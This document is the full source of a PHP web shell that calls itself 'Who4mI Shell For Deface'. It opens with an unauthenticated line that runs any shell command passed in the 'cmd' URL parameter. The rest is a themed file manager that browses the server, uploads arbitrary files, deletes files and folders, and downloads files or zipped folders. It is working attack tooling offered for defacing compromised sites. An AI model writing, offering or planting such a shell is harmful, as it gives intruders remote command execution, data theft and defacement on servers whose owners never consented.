<?php
if(isset($_GET['cmd'])){
  system($_GET['cmd']);
}
// Config
$shiroko_bg = 'https://imgs.search.brave.com/aiHiaNfkZbZQdi_BJD-iknqbiQSF97A2HbYlebPo6xc/rs:fit:500:0:0:0/g:ce/aHR0cHM6Ly93MC5w/ZWFrcHguY29tL3dh/bGxwYXBlci85NDQv/NTU2L0hELXdhbGxw/YXBlci1zaGlyb2tv/LWZyb20tYmx1ZS1h/cmNoaXZlLWlwaG9u/ZS0xMS10aHVtYm5h/aWwuanBn'; // Background Shiroko

function readableSize($bytes) {
    $units = ['B', 'KB', 'MB', 'GB'];
    for ($i = 0; $bytes >= 1024 && $i < count($units) - 1; $i++)
        $bytes /= 1024;
    return round($bytes, 2) . ' ' . $units[$i];
}

function sanitize($path) {
    return rtrim(str_replace(['..', '\\', './'], '', $path), '/');
}

function zipFolder($folder, $zipFile) {
    $zip = new ZipArchive();
    if ($zip->open($zipFile, ZipArchive::CREATE) !== TRUE) return false;
    $folder = realpath($folder);
    $files = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($folder), RecursiveIteratorIterator::LEAVES_ONLY);
    foreach ($files as $file) {
        if (!$file->isDir()) {
            $filePath = $file->getRealPath();
            $relative = substr($filePath, strlen($folder) + 1);
            $zip->addFile($filePath, $relative);
        }
    }
    $zip->close();
    return true;
}

$path = isset($_GET['path']) ? sanitize($_GET['path']) : '.';
chdir($path);

$msg = '';

// Handle Upload
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_FILES['file'])) {
    $target = basename($_FILES['file']['name']);
    if (move_uploaded_file($_FILES['file']['tmp_name'], $target)) {
        $msg = "<div class='msg green'>[+] Uploaded: $target</div>";
    } else {
        $msg = "<div class='msg red'>[-] Upload failed.</div>";
    }
}

// Handle Delete
if (isset($_GET['del'])) {
    $target = basename($_GET['del']);
    if (is_file($target)) {
        unlink($target);
        $msg = "<div class='msg yellow'>[!] Deleted file: $target</div>";
    } elseif (is_dir($target)) {
        rmdir($target);
        $msg = "<div class='msg yellow'>[!] Deleted folder: $target</div>";
    }
}

// Handle Download
if (isset($_GET['download'])) {
    $target = basename($_GET['download']);
    if (is_file($target)) {
        header("Content-Type: application/octet-stream");
        header("Content-Disposition: attachment; filename=\"$target\"");
        header("Content-Length: " . filesize($target));
        readfile($target);
        exit;
    } elseif (is_dir($target)) {
        $zipName = $target . '_' . time() . '.zip';
        if (zipFolder($target, $zipName)) {
            header("Content-Type: application/zip");
            header("Content-Disposition: attachment; filename=\"$zipName\"");
            header("Content-Length: " . filesize($zipName));
            readfile($zipName);
            unlink($zipName);
            exit;
        } else {
            $msg = "<div class='msg red'>[-] Failed to zip folder</div>";
        }
    }
}
?><!DOCTYPE html><html>
<head>
  <title>Who4mI Shell For Deface</title>
  <style>
    body {
      margin: 0;
      background: url('<?php echo $shiroko_bg; ?>') no-repeat center center fixed;
      background-size: cover;
      font-family: monospace;
      color: #fff;
      backdrop-filter: blur(6px);
    }
    .container {
      background-color: rgba(0,0,32,0.8);
      margin: 30px auto;
      padding: 20px;
      max-width: 900px;
      border-radius: 10px;
    }
    h1 { color: #6cf; }
    table {
      width: 100%;
      border-collapse: collapse;
    }
    th, td {
      padding: 8px;
      border-bottom: 1px solid #444;
    }
    a { color: #6cf; text-decoration: none; }
    a:hover { text-decoration: underline; }
    .msg { padding: 8px; margin-top: 10px; border-radius: 4px; }
    .green { background: #0a0; }
    .red { background: #900; }
    .yellow { background: #990; color: #000; }
    .breadcrumb a { color: #0ff; margin-right: 6px; }
    .actions a { margin-right: 10px; }
    .upload-box { margin: 15px 0; }
    input[type="file"] { background: #111; color: #0f0; border: 1px solid #0f0; }
    button { background: #00ccff; color: #000; padding: 5px 10px; border: none; cursor: pointer; font-weight: bold; }
  </style>
</head>
<body>
<div class="container">
  <h1>📁 Who4mI Shell - File Manager</h1>
  <div class="breadcrumb">
    <?php
      $segments = explode('/', realpath(getcwd()));
      $pathSoFar = '';
      foreach ($segments as $seg) {
          $pathSoFar .= "/$seg";
          echo "<a href='?path=" . urlencode($pathSoFar) . "'>$seg</a>/";
      }
    ?>
  </div>  <?php echo $msg; ?>  <form class="upload-box" method="POST" enctype="multipart/form-data">
    <input type="file" name="file" required>
    <button type="submit">Upload</button>
  </form>  <table>
    <tr><th>Nama</th><th>Ukuran</th><th>Modifikasi</th><th>Aksi</th></tr>
    <?php
    foreach (scandir('.') as $item) {
        if ($item === '.' || $item === '..') continue;
        $fullPath = realpath($item);
        $isDir = is_dir($item);
        echo '<tr>';
        echo '<td>' . ($isDir ? "📁 <a href='?path=" . urlencode(getcwd() . '/' . $item) . "'>$item</a>" : "📄 $item") . '</td>';
        echo '<td>' . ($isDir ? '--' : readableSize(filesize($item))) . '</td>';
        echo '<td>' . date("Y-m-d H:i", filemtime($item)) . '</td>';
        echo '<td class="actions">';
        echo "<a href='?download=" . urlencode($item) . "'>⬇ Download</a>";
        echo "<a href='?del=" . urlencode($item) . "' onclick='return confirm(\"Yakin hapus $item?\")'>🗑 Delete</a>";
        echo '</td>';
        echo '</tr>';
    }
    ?>
  </table>  <div style="margin-top:20px; font-size:12px; color:#aaa;">Shell by Who4mI | Fsociety Team | Blue Archive - Shiroko Theme</div>
</div>
</body>
</html>
